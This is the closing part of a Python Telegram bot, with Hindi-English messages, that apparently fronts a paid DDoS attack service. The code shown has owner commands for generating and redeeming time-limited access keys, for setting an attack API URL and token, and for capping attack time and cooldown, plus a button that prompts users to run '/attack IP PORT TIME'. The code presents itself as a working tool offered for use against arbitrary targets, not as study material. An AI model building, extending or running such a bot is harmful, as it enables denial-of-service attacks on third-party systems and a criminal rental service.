        bot.reply_to(msg, "ℹ️ Yeh sticker already added hai.")

# ============= VIDEO HANDLER =============
_pending_pyf = {}

@bot.message_handler(content_types=['video'])
def handle_video(msg):
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.video.file_id

    if _pending_pyf.get(uid):
        _pending_pyf[uid] = False
        if file_id not in data["pyf_videos"]:
            data["pyf_videos"].append(file_id)
            save_data(data)
            bot.reply_to(msg, f"✅ PYF Video added!\n🎬 Total: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "ℹ️ Yeh PYF video already added hai.")
    else:
        if file_id not in data["videos"]:
            data["videos"].append(file_id)
            save_data(data)
            bot.reply_to(msg, f"✅ Video auto-added!\n📹 Total: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "ℹ️ Yeh video already added hai.")

# ============= SETTINGS COMMAND =============
@bot.message_handler(commands=['settings'])
def cmd_settings(msg):
    if not is_owner(msg.from_user.id): return
    txt = (
        "⚙️ <b>ALL COMMANDS — OWNER ONLY</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👑 <b>OWNER COMMANDS</b>\n"
        "┣ /panel ➪ Owner Panel\n"
        "┣ /users ➪ Users List\n"
        "┣ /stats ➪ Stats\n"
        "┣ /broadcast MSG ➪ Broadcast\n"
        "┣ /ban ID ➪ Ban User\n"
        "┗ /unban ID ➪ Unban User\n\n"
        "🔑 <b>KEY MANAGEMENT</b>\n"
        "┣ /genkey DAYS [AMOUNT] ➪ Generate Keys\n"
        "┗ /redeem KEY ➪ Redeem Key\n\n"
        "📡 <b>API MANAGEMENT</b>\n"
        "┣ /setapi URL TOKEN [method] [geo] ➪ Set API\n"
        "┣ /testapi ➪ Test API\n"
        "┣ /setmaxtime SEC ➪ Max Attack Time\n"
        "┗ /setcooldown SEC ➪ Cooldown\n\n"
        "🔧 <b>BOT SETTINGS</b>\n"
        "┗ /maintenance ➪ ON/OFF Maintenance\n\n"
        "❄ <b>STICKER</b>\n"
        "┣ Send sticker ➪ Auto Add\n"
        "┣ /removesticker NUMBER ➪ Remove Sticker\n"
        "┗ /liststickers ➪ List Stickers\n\n"
        "📹 <b>VIDEO (Attack ke saath)</b>\n"
        "┣ Send video ➪ Auto Add\n"
        "┣ /listvideo ➪ List Videos\n"
        "┗ /delvideo NUMBER ➪ Delete Video\n\n"
        "🎬 <b>PYF VIDEO (Start ke saath)</b>\n"
        "┣ /addpyf ➪ Add PYF Video (fir video forward)\n"
        "┣ /listpyf ➪ List PYF Videos\n"
        "┗ /delpyf NUMBER ➪ Delete PYF Video\n\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

# ============= BUTTONS =============
@bot.message_handler(func=lambda m: m.text == "🔥 ATTACK")
def btn_attack(msg):
    bot.reply_to(msg, "🎯 <code>/attack IP PORT TIME</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 STATUS")
def btn_status(msg): cmd_status(msg)

@bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
def btn_profile(msg): cmd_profile(msg)

@bot.message_handler(func=lambda m: m.text == "👑 OWNER PANEL")
def btn_owner(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg, "👑 <b>PANEL</b>", reply_markup=kb_owner(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔑 REDEEM")
def btn_redeem(msg):
    bot.reply_to(msg, "🔑 <code>/redeem KEY</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔑 GEN KEY")
def btn_genkey(msg):
    bot.reply_to(msg, "🔑 <code>/genkey DAYS AMOUNT</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 STATS")
def btn_stats(msg): cmd_stats(msg)

@bot.message_handler(func=lambda m: m.text == "👥 USERS")
def btn_users(msg): cmd_users(msg)

@bot.message_handler(func=lambda m: m.text == "📢 BROADCAST")
def btn_broadcast(msg):
    bot.reply_to(msg, "📢 <code>/broadcast MSG</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "⚙️ SETTINGS")
def btn_settings(msg):
    cmd_settings(msg)

@bot.message_handler(func=lambda m: m.text == "❌ CLOSE")
def btn_close(msg):
    bot.reply_to(msg, "❌ Closed.", reply_markup=kb_main(msg.from_user.id))

# ============= MAIN =============
print("=" * 55)
print(f"  {BOT_NAME}")
print("=" * 55)
print(f"  👑 Owner: {BOT_OWNER}")
print(f"  📡 API: {get_setting('api_url', DEFAULT_API_URL)}")
print(f"  ❄ Stickers: {len(data.get('stickers', []))}")
print(f"  📹 Videos: {len(data.get('videos', []))}")
print(f"  🎬 PYF Videos: {len(data.get('pyf_videos', []))}")
print("=" * 55)
print("  ✅ Bot running...")
print("=" * 55)

while True:
    try:
        bot.remove_webhook()
        time.sleep(0.5)
        bot.polling(
            none_stop=True,
            interval=0,
            timeout=20,
            long_polling_timeout=15,
            allowed_updates=["message", "callback_query"]
        )
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
        break
    except Exception as e:
        print(f"⚠️ Polling Error: {e}")
        time.sleep(3)
